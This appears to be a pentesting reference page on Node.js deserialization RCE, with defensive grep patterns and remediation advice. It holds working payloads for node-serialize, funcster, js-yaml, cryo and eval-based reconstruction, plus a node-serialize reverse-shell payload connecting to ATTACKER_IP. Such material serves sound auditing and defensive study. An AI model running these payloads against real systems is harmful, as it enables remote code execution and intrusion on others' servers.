---
title: Node.js deserialization RCE
slug: nodejs-deserialization
aliases: [node-serialize, funcster, js-yaml unsafe, Node deserialization, JavaScript deserialization]
---

> **TL;DR:** Node.js has no native serialisation format like Java's `ObjectInputStream` or Python's `pickle`, but third-party libraries (`node-serialize`, `funcster`, `js-yaml`, `cryo`, `serialize-javascript`) reconstruct objects in ways that execute arbitrary code during deserialisation. Finding these in source review is a direct path to RCE.

## What it is
JavaScript's `JSON.parse()` is safe — it produces only data (strings, numbers, arrays, plain objects). The danger comes from libraries that go further: restoring functions, class instances, or type-tagged objects from serialised input. If attacker-controlled data flows into one of these deserialisation sinks, the reconstruction process executes embedded code.

## Preconditions
- Application uses a vulnerable serialisation library (see below).
- Attacker-controlled input reaches the deserialisation function — common via cookies, WebSocket messages, request bodies, or stored data (Redis, database, file).
- The library reconstructs functions or uses `eval`/`new Function` internally.

## Vulnerable libraries and exploitation

### 1 — node-serialize

The classic Node.js deserialisation CVE. `node-serialize` uses `eval()` to reconstruct functions:

```javascript
var serialize = require('node-serialize');

// Attacker-controlled payload — IIFE executes on unserialize()
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'id\')}()"}';

serialize.unserialize(payload);  // RCE
```

The `_$$ND_FUNC$$_` marker tells the library to `eval()` the function body. The trailing `()` makes it an IIFE — it executes immediately during deserialisation.

**Reverse shell payload:**

```javascript
{"rce":"_$$ND_FUNC$$_function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var client=new net.Socket();client.connect(4444,'ATTACKER_IP',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client)})}()"}
```

### 2 — funcster

`funcster` serialises and deserialises JavaScript functions using `new Function()`:

```javascript
var funcster = require('funcster');

// Serialised object with embedded function
var malicious = {
  __js_function: 'function(){return require("child_process").execSync("id").toString()}'
};

var obj = funcster.deepDeserialize(malicious);
obj();  // RCE — or the function may auto-execute depending on usage
```

### 3 — js-yaml (unsafe load)

`js-yaml` before v4 had `yaml.load()` which supported custom YAML tags that instantiate arbitrary JavaScript objects:

```yaml
# Payload for js-yaml < 4.0 (yaml.load, not yaml.safeLoad)
"toString": !<tag:yaml.org,2002:js/function> "function(){ return require('child_process').execSync('id').toString(); }"
```

```javascript
var yaml = require('js-yaml');

// VULNERABLE — yaml.load() with default schema in js-yaml < 4
var obj = yaml.load(userInput);
// If obj is coerced to string (e.g., template rendering, concatenation),
// the toString() function executes

// SAFE — js-yaml >= 4 removed unsafe types; safeLoad is the only option
var obj = yaml.load(userInput);  // v4+ is safe by default
```

**Other dangerous YAML tags:**

```yaml
# Instantiate arbitrary objects
!!js/undefined ''
!!js/regexp /regex/
!!js/function 'function(){ /* code */ }'
```

### 4 — cryo

`cryo` serialises complex objects including functions, dates, and circular references:

```javascript
var Cryo = require('cryo');

// cryo uses JSON with type annotations; functions are restored via eval
var payload = '{"root":"_CRYO_REF_3","references":[{"contents":{},"value":"_CRYO_FUNCTION_function(){return require(\'child_process\').execSync(\'id\').toString()}"}]}';

var obj = Cryo.parse(payload);
obj();  // RCE
```

### 5 — serialize-javascript + eval

`serialize-javascript` (by Yahoo) serialises to a JavaScript expression string. It is only dangerous if the output is passed to `eval()` — which some codebases do for SSR hydration:

```javascript
var serialize = require('serialize-javascript');

// The library output is a JS expression, not JSON
var serialized = serialize({fn: function() { return 1; }});
// Output: "{fn:function() { return 1; }}"

// VULNERABLE pattern: eval to reconstruct
var obj = eval('(' + userControlledSerialized + ')');  // RCE
```

## Source review detection

### Grep patterns

```bash
# Direct deserialisation sinks
grep -rn "unserialize\|deserialize\|Cryo\.parse" --include="*.js" --include="*.ts" .

# js-yaml unsafe load (pre-v4 or explicit unsafe schema)
grep -rn "yaml\.load\b\|FAILSAFE_SCHEMA\|JSON_SCHEMA\|DEFAULT_FULL_SCHEMA" --include="*.js" --include="*.ts" .

# eval-based reconstruction
grep -rn "eval(\|new Function(" --include="*.js" --include="*.ts" .

# Check package.json for vulnerable libraries
grep -E "node-serialize|funcster|cryo|serialize-javascript|js-yaml" package.json package-lock.json
```

### Triage flow

1. **Find the sink** — which deserialisation function is called?
2. **Trace the source** — does attacker-controlled input reach it? Check cookies (`req.cookies`), request body (`req.body`), query params, WebSocket messages, database reads.
3. **Check the library version** — `js-yaml` >= 4 is safe by default; `serialize-javascript` is only dangerous with `eval`.
4. **Confirm exploitability** — craft a payload for the specific library and verify code execution.

## Prototype pollution as a deserialisation vector

Even safe `JSON.parse()` can be dangerous if the parsed object is merged unsafely:

```javascript
// If attacker sends: {"__proto__": {"isAdmin": true}}
// And the app does: Object.assign(user, JSON.parse(body))
// Then: ({}).isAdmin === true  (prototype polluted)
```

This isn't deserialisation RCE directly, but it chains with template engines (EJS, Pug, Handlebars) where polluted prototype properties become template options that enable code execution. See [[prototype-pollution]] and [[ssti-by-engine]].

## Defence
- **Never deserialise untrusted input** with anything other than `JSON.parse()`.
- Remove `node-serialize`, `funcster`, and `cryo` from dependencies entirely — they have no safe mode.
- Upgrade `js-yaml` to v4+ (safe by default); never use `yaml.load()` with `DEFAULT_FULL_SCHEMA` on untrusted input.
- Never `eval()` serialised data — if using `serialize-javascript` for SSR, reconstruct with `JSON.parse()` instead.
- Use `Object.create(null)` for parsed objects to prevent prototype pollution.
- CSP and sandboxing as defence-in-depth, but the primary fix is eliminating the unsafe deserialisation call.

See also [[deserialisation]], [[dangerous-nodejs-sinks]], [[nodejs-code-auditing]], [[prototype-pollution]], [[express-nestjs-audit-patterns]].

## References
- [CVE-2017-5941](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941) — node-serialize RCE
- [Ajin Abraham — Exploiting node-serialize](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) — original writeup
- [HackTricks — Node deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/index.html) — exploitation reference
- [PayloadsAllTheThings — Node deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Node.md) — payload catalogue
